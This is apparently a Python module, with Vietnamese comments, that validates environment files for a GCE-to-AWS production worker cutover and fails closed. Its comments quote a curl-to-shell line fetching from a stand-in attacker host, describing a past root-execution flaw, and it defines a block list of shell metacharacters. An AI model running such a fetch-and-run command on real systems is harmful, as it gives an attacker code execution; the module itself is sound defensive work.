#!/usr/bin/env python3
"""Danh sach cho phep (allowlist) va cac phep khang dinh cua cutover
GCE -> AWS. Thuan tuy, khong I/O, khong mang — de test duoc het.

VI SAO TACH RIENG TEP NAY
-------------------------
Toan bo tinh an toan cua cuoc cutover nam o mot cau hoi duy nhat: *cai
worker sap khoi dong co dang tro dung vao production that khong, va co
dang tro NHAM vao staging khong*. Cau hoi do phai tra loi duoc bang mot
ham thuan tuy, chay duoc trong unit test, khong can may that, khong can
credential.

Moi phep kiem o day **fail closed**: thieu du lieu la TU CHOI, khong phai
"cho qua vi khong ro".

KHONG BAO GIO in gia tri bi mat. Cac ham nhan `dict` env va chi tra ve
ten bien + phan loai; gia tri duy nhat duoc phep hien ra la nhung toa do
KHONG bi mat (endpoint, project, database, bucket, backend) — dung cung
mot ly le nhu `fanfic_staging_admin.sh`: ten bucket khong phai bi mat, va
no la thu quan trong nhat can doc duoc de biet co tro nham hay khong.
"""
from __future__ import annotations

from typing import Dict, Iterable, List, Mapping, Optional, Tuple

# --------------------------------------------------------------------------
# TOA DO PRODUCTION — nguon su that duy nhat trong ma nguon.
#
# Do that ngay 2026-09-04 tu dich vu Render `fas-prod-api` qua
# `fanfic_credential_broker.render_non_secret_env` (allowlist ap o chieu
# TRA VE, nen mot bien bi doi ten phia Render khong the noi rong duoc).
#
# Luu y kien truc QUAN TRONG: production KHONG dung Appwrite Cloud. No
# dung ban TU LUU TRU o `appwrite-dev.fanfic.world` (may GCE
# `fanfic-appwrite-temp`). `docs/AWS_STAGING_MIGRATION.md` muc 0 noi
# nguoc lai — tai lieu do da CU. Xem `docs/PRODUCTION_CUTOVER.md`.
# --------------------------------------------------------------------------
PROD_APPWRITE_ENDPOINT = "https://appwrite-dev.fanfic.world/v1"
PROD_APPWRITE_PROJECT_ID = "fanfic-world-prod"
PROD_APPWRITE_DATABASE_ID = "fanfic_world_prod"
PROD_R2_BUCKET = "fanfic-prod"

#: Bucket cua staging. Dung de PHAN BIET, khong phai de cho phep: mot tep
#: env production ma tro vao day la sai huong nghiem trong.
STAGING_R2_BUCKETS = ("fanfic-staging", "fanfic-dev")

#: Bien bat buoc phai co gia tri trong tep env cua worker production.
#: Lay tu `server/config.py::Settings.validate()` cho DATA_BACKEND=appwrite
#: + STORAGE_BACKEND=r2. Worker khong phuc vu HTTP nen khong co bien CORS
#: hay auth-token nao trong danh sach nay.
REQUIRED_ENV_NAMES: Tuple[str, ...] = (
    "FAS_ENV",
    "DATA_BACKEND",
    "STORAGE_BACKEND",
    "FAS_INLINE_WORKER",
    "APPWRITE_ENDPOINT",
    "APPWRITE_PROJECT_ID",
    "APPWRITE_DATABASE_ID",
    "APPWRITE_API_KEY",
    "R2_ACCOUNT_ID",
    "R2_BUCKET",
    "R2_ACCESS_KEY_ID",
    "R2_SECRET_ACCESS_KEY",
    # CHINH SACH GIONG — bat buoc, khong phai tuy chon.
    #
    # Thieu `FAS_LOCAL_VOICES` thi `voice_is_local_allowed()` tra False cho
    # MOI giong, worker NHAN job roi that bai voi "Giọng '...' hiện không
    # được cung cấp." Job chet chu khong duoc nhuong. Da xay ra that mot lan
    # tren staging (xem `git log` PR #136) va no ton mot vong chung minh.
    "FAS_LOCAL_VOICES",
    "FAS_PUBLIC_VOICE_LANGUAGES",
)

#: Bien bat buoc cho tep env cua WORKER DICH production.
#:
#: Hinh dang KHAC worker TTS, va do la co y — do that tu log khoi dong cua
#: `fanfic-translation-worker-prod` tren GCE (2026-08-24):
#:
#:     storage: local · r2_configured: false · local_voices: ["piper:ngochuyen"]
#:
#: Worker dich sinh ra VAN BAN, khong sinh audio, nen no khong can R2. Ep
#: no dung bo bien cua worker TTS se la sao chep sai ban goc.
TRANSLATION_REQUIRED_ENV_NAMES: Tuple[str, ...] = (
    "FAS_ENV",
    "DATA_BACKEND",
    "STORAGE_BACKEND",
    "FAS_INLINE_WORKER",
    "FAS_TRANSLATION_INLINE_WORKER",
    "APPWRITE_ENDPOINT",
    "APPWRITE_PROJECT_ID",
    "APPWRITE_DATABASE_ID",
    "APPWRITE_API_KEY",
    "FAS_LOCAL_VOICES",
)

#: Gia tri co dinh cho worker dich. `STORAGE_BACKEND=local` khop GCE.
TRANSLATION_FIXED_ENV_VALUES: Dict[str, str] = {
    "FAS_ENV": "production",
    "DATA_BACKEND": "appwrite",
    "STORAGE_BACKEND": "local",
    "FAS_INLINE_WORKER": "false",
    "FAS_TRANSLATION_INLINE_WORKER": "false",
}

#: Nhung bien mang gia tri BI MAT. Khong bao giờ in gia tri cua chung —
#: chi bao CO/THIEU va do dai.
SECRET_ENV_NAMES: Tuple[str, ...] = (
    "APPWRITE_API_KEY",
    "R2_ACCESS_KEY_ID",
    "R2_SECRET_ACCESS_KEY",
    "R2_ACCOUNT_ID",
)

#: Gia tri co dinh bat buoc. Sai mot trong nhung cai nay la worker se lam
#: sai viec (vi du `FAS_INLINE_WORKER=true` bien tien trinh worker thanh
#: mot tien trinh tu cam chinh minh — loi that da gap, xem
#: `docs/reports/staging/BAO_CAO_STAGING.md` muc 3).
FIXED_ENV_VALUES: Dict[str, str] = {
    "FAS_ENV": "production",
    "DATA_BACKEND": "appwrite",
    "STORAGE_BACKEND": "r2",
    "FAS_INLINE_WORKER": "false",
}

#: Unit systemd cua worker PRODUCTION. Danh sach DONG CUNG.
PROD_UNITS: Tuple[str, ...] = (
    "fanfic-worker-prod.service",
    "fanfic-translation-worker-prod.service",
    "fanfic-worker-prod-health.timer",
)

#: Unit STAGING tren chinh may AWS. Phai TAT truoc khi bat production —
#: mot may chay ca hai la mot may claim job cua ca hai du an.
STAGING_UNITS: Tuple[str, ...] = (
    "fanfic-worker.service",
    "fanfic-translation-worker.service",
    "fanfic-worker-health.timer",
)


class CutoverRefused(Exception):
    """Mot phep khang dinh that bai. Luon fail closed."""


#: Ky tu KHONG BAO GIO duoc phep nam trong mot gia tri env.
#:
#: Tep env nay tung duoc `bash` doc bang `. <(...)`, va khi do mot dong nhu
#: `X=$(curl ke-tan-cong/x | sh)` chay bang ROOT. Duong `bash source` da bi
#: go bo (Python doc thang tep bang `doc_env_text`), nhung danh sach nay
#: van o day lam LOP THU HAI: khong bao gio de mot gia tri co hinh dang
#: chay duoc di qua, ke ca khi mot ngay nao do co nguoi them lai mot duong
#: sourcing.
#:
#: Xuong dong nam trong danh sach vi mot ly do rieng: `\n` trong gia tri se
#: TACH thanh mot dong moi trong tep env, tuc la them mot bien khong ai
#: kiem — chinh la duong ma F1 di qua.
KY_TU_CAM = ("$", "`", "\n", "\r", "\\", ";", "|", "&", "<", ">", "\0")


def _sach(v: Optional[str]) -> str:
    """Chuan hoa mot gia tri env: bo khoang trang va \\r cua CRLF.

    Tep env tung mang CRLF that (script scp tu Windows) va hau qua la
    `APPWRITE_ENDPOINT` co \\r o cuoi -> `InvalidURL: ... '\\r' at position
    36`. `systemd` cat \\r khi doc EnvironmentFile nhung `bash .` thi khong,
    nen hai ben tung thay hai gia tri khac nhau tu CUNG mot tep.
    """
    return (v or "").strip().strip("\r")


def phan_loai_bucket(bucket: Optional[str]) -> str:
    """`production` | `staging` | `unknown`. Khong nem loi — de ben goi quyet dinh."""
    b = _sach(bucket)
    if b == PROD_R2_BUCKET:
        return "production"
    if b in STAGING_R2_BUCKETS:
        return "staging"
    return "unknown"


def thieu_bien(env: Mapping[str, str]) -> List[str]:
    """Ten cac bien bat buoc dang thieu hoac rong. Chi TEN, khong gia tri."""
    return [n for n in REQUIRED_ENV_NAMES if not _sach(env.get(n))]


def bien_nguy_hiem(env: Mapping[str, str]) -> List[str]:
    """Ten cac bien co gia tri chua ky tu chay duoc. Chi TEN, khong gia tri.

    Quet **toan bo** tep, khong chi `REQUIRED_ENV_NAMES` — mot bien LA
    (`X=$(...)`) van la mot dong trong tep env, va do dung la cach ban dau
    khang dinh bo sot no.
    """
    xau: List[str] = []
    for ten, gt in env.items():
        v = gt or ""
        if any(c in v for c in KY_TU_CAM):
            xau.append(ten)
    return sorted(xau)


def bien_ngoai_danh_sach(env: Mapping[str, str]) -> List[str]:
    """Ten cac bien KHONG nam trong `REQUIRED_ENV_NAMES`.

    Tep env cua worker production duoc SINH RA tu allowlist, nen mot bien
    la o day nghia la co ai do da chen them — khong phai mot cau hinh hop
    le bi bo quen.
    """
    return sorted(set(env) - set(REQUIRED_ENV_NAMES))


def khang_dinh_production(env: Mapping[str, str]) -> None:
    """Tep env nay CO PHAI production that khong. Nem `CutoverRefused` neu khong.

    Day la cong duy nhat truoc khi bat worker production tren may moi.
    Thu tu kiem duoc chon co y: bien thieu -> gia tri co dinh -> danh tinh
    Appwrite -> bucket R2. Cai cuoi cung la cai nguy hiem nhat nen no duoc
    kiem sau cung, khi moi thu khac da chac chan.
    """
    thieu = thieu_bien(env)
    if thieu:
        raise CutoverRefused(f"thieu bien bat buoc: {', '.join(thieu)}")

    for ten, mong_muon in FIXED_ENV_VALUES.items():
        thuc_te = _sach(env.get(ten)).lower()
        if thuc_te != mong_muon:
            raise CutoverRefused(
                f"{ten} phai la {mong_muon!r}, dang la {thuc_te!r}")

    cap = (
        ("APPWRITE_ENDPOINT", PROD_APPWRITE_ENDPOINT),
        ("APPWRITE_PROJECT_ID", PROD_APPWRITE_PROJECT_ID),
        ("APPWRITE_DATABASE_ID", PROD_APPWRITE_DATABASE_ID),
    )
    for ten, mong_muon in cap:
        thuc_te = _sach(env.get(ten))
        if thuc_te != mong_muon:
            raise CutoverRefused(
                f"{ten} khong khop production: mong doi {mong_muon!r}, "
                f"dang la {thuc_te!r}")

    loai = phan_loai_bucket(env.get("R2_BUCKET"))
    if loai == "staging":
        raise CutoverRefused(
            f"R2_BUCKET={_sach(env.get('R2_BUCKET'))!r} la bucket STAGING — "
            "tep env production khong duoc tro vao day")
    if loai != "production":
        raise CutoverRefused(
            f"R2_BUCKET={_sach(env.get('R2_BUCKET'))!r} khong nam trong "
            f"allowlist (production={PROD_R2_BUCKET!r})")


def khang_dinh_translation_production(env: Mapping[str, str]) -> None:
    """Khang dinh cho tep env cua WORKER DICH production.

    Cung danh tinh Appwrite production nhu worker TTS, nhung KHONG doi R2:
    worker dich khong sinh audio. Xem `TRANSLATION_REQUIRED_ENV_NAMES`.
    """
    thieu = [n for n in TRANSLATION_REQUIRED_ENV_NAMES if not _sach(env.get(n))]
    if thieu:
        raise CutoverRefused(f"thieu bien bat buoc: {', '.join(thieu)}")

    for ten, mong_muon in TRANSLATION_FIXED_ENV_VALUES.items():
        thuc_te = _sach(env.get(ten)).lower()
        if thuc_te != mong_muon:
            raise CutoverRefused(
                f"{ten} phai la {mong_muon!r}, dang la {thuc_te!r}")

    for ten, mong_muon in (("APPWRITE_ENDPOINT", PROD_APPWRITE_ENDPOINT),
                           ("APPWRITE_PROJECT_ID", PROD_APPWRITE_PROJECT_ID),
                           ("APPWRITE_DATABASE_ID", PROD_APPWRITE_DATABASE_ID)):
        if _sach(env.get(ten)) != mong_muon:
            raise CutoverRefused(
                f"{ten} khong khop production: mong doi {mong_muon!r}, "
                f"dang la {_sach(env.get(ten))!r}")

    # Worker dich KHONG duoc mang credential R2. No khong can, va mot khoa
    # thua la mot khoa co the ro ri ma khong ai co ly do de dung.
    thua = [k for k in ("R2_ACCESS_KEY_ID", "R2_SECRET_ACCESS_KEY")
            if _sach(env.get(k))]
    if thua:
        raise CutoverRefused(
            f"worker dich khong duoc mang credential R2: {', '.join(thua)}")


def khang_dinh_tep_env_translation(env: Mapping[str, str]) -> None:
    """Ban NGHIEM NGAT cho TEP env cua worker dich."""
    xau = bien_nguy_hiem(env)
    if xau:
        raise CutoverRefused(f"gia tri chua ky tu chay duoc o: {', '.join(xau)}")
    la = sorted(set(env) - set(TRANSLATION_REQUIRED_ENV_NAMES))
    if la:
        raise CutoverRefused(
            f"bien ngoai allowlist trong tep env worker dich: {', '.join(la)}")
    khang_dinh_translation_production(env)


def khang_dinh_tep_env(env: Mapping[str, str]) -> None:
    """Khang dinh cho mot TEP env production. Nghiem ngat hon `os.environ`.

    Hai phep kiem chi co y nghia voi mot TEP — `os.environ` cua bat ky tien
    trinh nao cung co PATH/HOME/... nen ap chung o do se tu choi moi thu:

      1. **khong bien nao ngoai allowlist.** Tep nay duoc SINH RA tu
         `REQUIRED_ENV_NAMES`, nen mot bien la nghia la co ai do chen them.
      2. **khong gia tri nao chua ky tu chay duoc.**

    Ca hai deu la hau qua truc tiep cua mot lo hong that: tep tung duoc
    `bash` doc bang `. <(...)` bang ROOT, va bo phan tich thi BO QUA moi
    dong khong co `=`. Nen `curl ke-tan-cong/x | sh` di lot qua kiem duyet
    roi chay. Duong `source` da bi go bo; hai phep kiem nay la lop thu hai.
    """
    xau = bien_nguy_hiem(env)
    if xau:
        raise CutoverRefused(f"gia tri chua ky tu chay duoc o: {', '.join(xau)}")
    la = bien_ngoai_danh_sach(env)
    if la:
        raise CutoverRefused(
            f"bien ngoai allowlist trong tep env production: {', '.join(la)}")
    khang_dinh_production(env)


def khang_dinh_khong_phai_production(env: Mapping[str, str]) -> None:
    """Chieu NGUOC LAI: tep env nay phai KHONG tro vao production.

    Dung cho cac unit staging con lai tren cung may AWS. Neu mot ngay nao
    do env staging bi ghi de bang gia tri production thi hai worker se
    tranh claim job THAT — che do that bai nguy hiem nhat cua ca ke hoach.
    """
    if phan_loai_bucket(env.get("R2_BUCKET")) == "production":
        raise CutoverRefused(
            "env nay tro vao bucket PRODUCTION nhung dang duoc dung cho staging")
    # Doi xung voi `khang_dinh_production`: kiem CA BON toa do, khong chi
    # hai. Mot ban kiem nguoc thieu ve la mot ban kiem che giau sai cau
    # hinh thay vi bat no.
    for ten, gt_prod in (("APPWRITE_PROJECT_ID", PROD_APPWRITE_PROJECT_ID),
                         ("APPWRITE_DATABASE_ID", PROD_APPWRITE_DATABASE_ID),
                         ("APPWRITE_ENDPOINT", PROD_APPWRITE_ENDPOINT)):
        if _sach(env.get(ten)) == gt_prod:
            raise CutoverRefused(
                f"env nay co {ten} cua PRODUCTION nhung dang duoc dung cho staging")


def kiem_unit_production(unit: str) -> None:
    """Chi ba unit production duoc phep. Fail closed."""
    if unit not in PROD_UNITS:
        raise CutoverRefused(f"unit {unit!r} khong nam trong danh sach production")


def kiem_unit_staging(unit: str) -> None:
    if unit not in STAGING_UNITS:
        raise CutoverRefused(f"unit {unit!r} khong nam trong danh sach staging")


def tom_tat_env(env: Mapping[str, str],
                ten_bien: Optional[Iterable[str]] = None) -> List[str]:
    """Dong tom tat AN TOAN de in ra log/bao cao.

    Bien bi mat -> `<CO len=N>` hoac `<THIEU>`. Toa do khong bi mat -> in
    thang, vi khong doc duoc chung thi khong biet co tro nham hay khong.

    `ten_bien` mac dinh la bo cua worker TTS; truyen
    `TRANSLATION_REQUIRED_ENV_NAMES` cho worker dich.
    """
    dong: List[str] = []
    for ten in (ten_bien or REQUIRED_ENV_NAMES):
        gt = _sach(env.get(ten))
        if ten in SECRET_ENV_NAMES:
            dong.append(f"{ten}=<CO len={len(gt)}>" if gt else f"{ten}=<THIEU>")
        elif ten == "R2_BUCKET":
            dong.append(f"{ten}={gt or '<TRONG>'}  [{phan_loai_bucket(gt)}]")
        else:
            dong.append(f"{ten}={gt or '<TRONG>'}")
    return dong


def doc_env_text(noi_dung: str) -> Dict[str, str]:
    """Doc dinh dang `KEY=VALUE` cua systemd EnvironmentFile.

    Bo qua dong trong va dong `#`. Chuan hoa CRLF. Dong sau ghi de dong
    truoc — dung nhu `systemd` va nhu `grep ... | tail -1` ma cac script
    ops khac dang dung.
    """
    ra: Dict[str, str] = {}
    for dong in noi_dung.replace("\r\n", "\n").replace("\r", "\n").split("\n"):
        d = dong.strip()
        if not d or d.startswith("#") or "=" not in d:
            continue
        k, _, v = d.partition("=")
        ra[k.strip()] = v
    return ra


def nap_env_tu_tep(duong_dan) -> Dict[str, str]:
    """Doc mot tep env va tra ve map da KIEM.

    Thay cho `. <(tr -d '\\r' < tep)` cua bash. Do la mot khac biet an
    toan, khong phai mot khac biet phong cach: `bash source` **thuc thi**
    noi dung tep, nen mot dong `X=$(...)` — hoac bat ky dong nao khong co
    `=` — chay bang chinh quyen cua tien trinh dang doc, o day la root.
    Python chi PHAN TICH tep, khong bao gio chay no.
    """
    from pathlib import Path as _P

    env = doc_env_text(_P(duong_dan).read_text(encoding="utf-8", errors="replace"))
    khang_dinh_tep_env(env)
    return env


def render_env_text(env: Mapping[str, str], ten: Iterable[str] = REQUIRED_ENV_NAMES) -> str:
    """Sinh noi dung tep env, LF thuan, ket thuc bang mot dong moi.

    LF thuan la co y: xem `_sach()`. Tep nay se duoc ghi bang root tren may
    dich voi quyen 0640 root:fanfic.
    """
    dong = []
    for k in ten:
        v = _sach(env.get(k))
        if not v:
            raise CutoverRefused(f"khong the sinh env: {k} rong")
        if any(c in v for c in KY_TU_CAM):
            # Khong bao gio in `v` — no co the la mot bi mat.
            raise CutoverRefused(f"khong the sinh env: {k} chua ky tu chay duoc")
        dong.append(f"{k}={v}")
    return "\n".join(dong) + "\n"
